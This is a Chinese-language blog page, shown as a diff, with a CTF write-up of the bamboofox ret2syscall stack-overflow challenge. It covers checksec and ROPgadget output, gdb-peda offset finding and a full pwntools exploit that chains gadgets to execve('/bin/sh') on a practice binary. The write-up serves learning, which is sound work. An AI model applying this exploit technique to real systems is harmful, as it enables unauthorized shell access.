@@ -1,0 +1,841 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ret2syscall,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="题目地址：bamboofox-ret2syscall">
+<meta name="keywords" content="ret2syscall">
+<meta property="og:type" content="article">
+<meta property="og:title" content="bamboofox-ret2syscall">
+<meta property="og:url" content="https://hc1024.github.io/2019/10/20/bamboofox-ret2syscall/index.html">
+<meta property="og:site_name" content="HC1024">
+<meta property="og:description" content="题目地址：bamboofox-ret2syscall">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://i.loli.net/2019/10/20/Yqg7bcJ12kHW6eD.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/20/59KB4kZhIt67WLC.png">
+<meta property="og:updated_time" content="2019-10-20T05:33:13.652Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="bamboofox-ret2syscall">
+<meta name="twitter:description" content="题目地址：bamboofox-ret2syscall">
+<meta name="twitter:image" content="https://i.loli.net/2019/10/20/Yqg7bcJ12kHW6eD.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://hc1024.github.io/2019/10/20/bamboofox-ret2syscall/">
+
+
+
+
+
+  <title>bamboofox-ret2syscall | HC1024</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">HC1024</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-commonweal">
+          <a href="/404/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br>
+            
+            Commonweal 404
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://hc1024.github.io/2019/10/20/bamboofox-ret2syscall/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="HC">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="HC1024">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">bamboofox-ret2syscall</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-20T13:18:07+08:00">
+                2019-10-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  1.1k 
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  5
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>题目地址：<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall" target="_blank" rel="noopener">bamboofox-ret2syscall</a></p>
+<a id="more"></a>
+
+<h1 id="1-基本信息收集"><a href="#1-基本信息收集" class="headerlink" title="1.基本信息收集"></a>1.基本信息收集</h1><h2 id="查看文件信息"><a href="#查看文件信息" class="headerlink" title="查看文件信息"></a>查看文件信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file rop</span><br><span class="line">rop: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=2bff0285c2706a147e7b150493950de98f182b78, with debug_info, not stripped</span><br></pre></td></tr></table></figure>
+
+<h2 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">checksec rop</span><br><span class="line">[*] &apos;/home/hc/study/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+
+<h2 id="IDA反汇编看伪代码"><a href="#IDA反汇编看伪代码" class="headerlink" title="IDA反汇编看伪代码"></a>IDA反汇编看伪代码</h2><p><img src="https://i.loli.net/2019/10/20/Yqg7bcJ12kHW6eD.png" alt="r2sys1.png"></p>
+<h1 id="2-漏洞定位及利用思路"><a href="#2-漏洞定位及利用思路" class="headerlink" title="2.漏洞定位及利用思路"></a><strong>2.漏洞定位及利用思路</strong></h1><h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a><strong>ret2syscall</strong></h2><p>很明显gets()函数存在溢出漏洞，但本题没有找到system(“/bin/sh”)函数，且开启了堆栈不可执行保护，因此ret2text，ret2shellcode都无法使用。</p>
+<p>这时我们就可以使用ret2syscall的方法了。</p>
+<p>ret2syscall，即控制程序执行系统调用，获取 shell。简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(&quot;/bin/sh&quot;,NULL,NULL)</span><br></pre></td></tr></table></figure>
+
+<p>其中，该程序是 32 位，所以我们需要使得</p>
+<ul>
+<li>系统调用号，即 eax 应该为 0xb</li>
+<li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li>
+<li>第二个参数，即 ecx 应该为 0</li>
+<li>第三个参数，即 edx 应该为 0</li>
+</ul>
+<p>而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。</p>
+<h2 id="寻找gadgets"><a href="#寻找gadgets" class="headerlink" title="寻找gadgets"></a>寻找gadgets</h2><h3 id="eax"><a href="#eax" class="headerlink" title="eax"></a>eax</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop --only &quot;pop|ret&quot; | grep &quot;eax&quot;</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0807217a : pop eax ; ret 0x80e</span><br><span class="line">0x0804f704 : pop eax ; ret 3</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure>
+
+<p>这里我们选择0x080bb196</p>
+<h3 id="ebx"><a href="#ebx" class="headerlink" title="ebx"></a>ebx</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop --only &quot;pop|ret&quot; | grep &quot;ebx&quot;</span><br><span class="line">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x080be23f : pop ebx ; pop edi ; ret</span><br><span class="line">0x0806eb69 : pop ebx ; pop edx ; ret</span><br><span class="line">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class="line">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099c87 : pop ebx ; ret 8</span><br><span class="line">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class="line">0x0806336b : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class="line">0x0805c820 : pop esi ; pop ebx ; ret</span><br><span class="line">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0807b6ed : pop ss ; pop ebx ; ret</span><br></pre></td></tr></table></figure>
+
+<p>这里我们选择0x0806eb90</p>
+<h3 id="int-80"><a href="#int-80" class="headerlink" title="int 80"></a>int 80</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> ROPgadget --binary rop --only &apos;int&apos; </span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0806bbfd : int 0x66</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line">0x080938fe : int 0xbb</span><br><span class="line">0x08089488 : int 0xca</span><br><span class="line">0x080869b5 : int 0xf6</span><br><span class="line">0x0807b4d4 : int 0xfc</span><br><span class="line">0x080c1871 : int 6</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 7</span><br></pre></td></tr></table></figure>
+
+<p>0x08049421</p>
+<h3 id="bin-sh"><a href="#bin-sh" class="headerlink" title="/bin/sh"></a>/bin/sh</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop --string &apos;/bin/sh&apos;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080be408 : /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>0x080be408</p>
+<h1 id="3-利用步骤"><a href="#3-利用步骤" class="headerlink" title="3.利用步骤"></a>3.利用步骤</h1><h2 id="1-计算偏移量"><a href="#1-计算偏移量" class="headerlink" title="1.计算偏移量"></a>1.计算偏移量</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pattern create 150</span><br><span class="line">&apos;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&apos;</span><br><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /home/hc/study/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop </span><br><span class="line">This time, no system() and NO SHELLCODE!!!</span><br><span class="line">What do you plan to do?</span><br><span class="line">AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line"></span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x0 </span><br><span class="line">EBX: 0x80481a8 (&lt;_init&gt;:    push   ebx)</span><br><span class="line">ECX: 0xfbad2288 </span><br><span class="line">EDX: 0x80eb4e0 --&gt; 0x0 </span><br><span class="line">ESI: 0x0 </span><br><span class="line">EDI: 0x80ea00c --&gt; 0x8067b10 (&lt;__stpcpy_sse2&gt;:  mov    edx,DWORD PTR [esp+0x4])</span><br><span class="line">EBP: 0x6941414d (&apos;MAAi&apos;)</span><br><span class="line">ESP: 0xffffce60 (&quot;ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&quot;)</span><br><span class="line">EIP: 0x41384141 (&apos;AA8A&apos;)</span><br><span class="line">EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">Invalid $PC address: 0x41384141</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffce60 (&quot;ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&quot;)</span><br><span class="line">0004| 0xffffce64 (&quot;jAA9AAOAAkAAPAAlAAQAAmAARAAoAA&quot;)</span><br><span class="line">0008| 0xffffce68 (&quot;AAOAAkAAPAAlAAQAAmAARAAoAA&quot;)</span><br><span class="line">0012| 0xffffce6c (&quot;AkAAPAAlAAQAAmAARAAoAA&quot;)</span><br><span class="line">0016| 0xffffce70 (&quot;PAAlAAQAAmAARAAoAA&quot;)</span><br><span class="line">0020| 0xffffce74 (&quot;AAQAAmAARAAoAA&quot;)</span><br><span class="line">0024| 0xffffce78 (&quot;AmAARAAoAA&quot;)</span><br><span class="line">0028| 0xffffce7c (&quot;RAAoAA&quot;)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x41384141 in ?? ()</span><br><span class="line">gdb-peda$ pattern search</span><br><span class="line">Registers contain pattern buffer:</span><br><span class="line">EBP+0 found at offset: 108</span><br><span class="line">EIP+0 found at offset: 112</span><br><span class="line">Registers point to pattern buffer:</span><br><span class="line">[ESP] --&gt; offset 116 - size ~34</span><br><span class="line">Pattern buffer found at:</span><br><span class="line">0xf7ff9000 : offset    0 - size  150 (mapped)</span><br><span class="line">0xffffcdec : offset    0 - size  150 ($sp + -0x74 [-29 dwords])</span><br><span class="line">References to pattern buffer found at:</span><br><span class="line">0x080ea36c : 0xf7ff9000 (/home/hc/study/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop)</span><br><span class="line">0x080ea370 : 0xf7ff9000 (/home/hc/study/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop)</span><br><span class="line">0x080ea374 : 0xf7ff9000 (/home/hc/study/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop)</span><br><span class="line">0x080ea378 : 0xf7ff9000 (/home/hc/study/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop)</span><br><span class="line">0x080ea37c : 0xf7ff9000 (/home/hc/study/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop)</span><br><span class="line">0xffffccb4 : 0xf7ff9000 ($sp + -0x1ac [-107 dwords])</span><br><span class="line">0xffffcd50 : 0xf7ff9000 ($sp + -0x110 [-68 dwords])</span><br><span class="line">0xffffcd60 : 0xffffcdec ($sp + -0x100 [-64 dwords])</span><br><span class="line">0xffffcdd0 : 0xffffcdec ($sp + -0x90 [-36 dwords])</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-编写exp"><a href="#2-编写exp" class="headerlink" title="2.编写exp"></a>2.编写exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./rop'</span>)</span><br><span class="line">eax_addr = <span class="number">0x080bb196</span></span><br><span class="line">pd_pc_pb_r = <span class="number">0x0806eb90</span></span><br><span class="line">int_addr = <span class="number">0x08049421</span></span><br><span class="line">binsh_addr = <span class="number">0x080be408</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">'A'</span>*<span class="number">112</span>,eax_addr,<span class="number">0xb</span>,pd_pc_pb_r,<span class="number">0</span>,<span class="number">0</span>,binsh_addr,int_addr])</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/10/20/59KB4kZhIt67WLC.png" alt="r2sys2.png"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ret2syscall/" rel="tag"># ret2syscall</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/10/19/sniperoj-pwn100-shellcode-x86-64/" rel="next" title="sniperoj-pwn100-shellcode-x86-64">
+                <i class="fa fa-chevron-left"></i> sniperoj-pwn100-shellcode-x86-64
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="HC">
+            
+              <p class="site-author-name" itemprop="name">HC</p>
+              <p class="site-description motion-element" itemprop="description">一位网安专业的大二小白。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.cnblogs.com/r3t7rn/" title="r3t7rn" target="_blank">r3t7rn</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.cnblogs.com/LapterGrsd" title="LapterGrsd" target="_blank">LapterGrsd</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://leeeddin.github.io/" title="le3d1ng" target="_blank">le3d1ng</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.yodidi.cn/" title="小熊" target="_blank">小熊</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://thriumph.top/" title="Thriumph" target="_blank">Thriumph</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-基本信息收集"><span class="nav-number">1.</span> <span class="nav-text">1.基本信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#查看文件信息"><span class="nav-number">1.1.</span> <span class="nav-text">查看文件信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#查看保护"><span class="nav-number">1.2.</span> <span class="nav-text">查看保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IDA反汇编看伪代码"><span class="nav-number">1.3.</span> <span class="nav-text">IDA反汇编看伪代码</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-漏洞定位及利用思路"><span class="nav-number">2.</span> <span class="nav-text">2.漏洞定位及利用思路</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2syscall"><span class="nav-number">2.1.</span> <span class="nav-text">ret2syscall</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#寻找gadgets"><span class="nav-number">2.2.</span> <span class="nav-text">寻找gadgets</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#eax"><span class="nav-number">2.2.1.</span> <span class="nav-text">eax</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ebx"><span class="nav-number">2.2.2.</span> <span class="nav-text">ebx</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#int-80"><span class="nav-number">2.2.3.</span> <span class="nav-text">int 80</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bin-sh"><span class="nav-number">2.2.4.</span> <span class="nav-text">/bin/sh</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3-利用步骤"><span class="nav-number">3.</span> <span class="nav-text">3.利用步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-计算偏移量"><span class="nav-number">3.1.</span> <span class="nav-text">1.计算偏移量</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-编写exp"><span 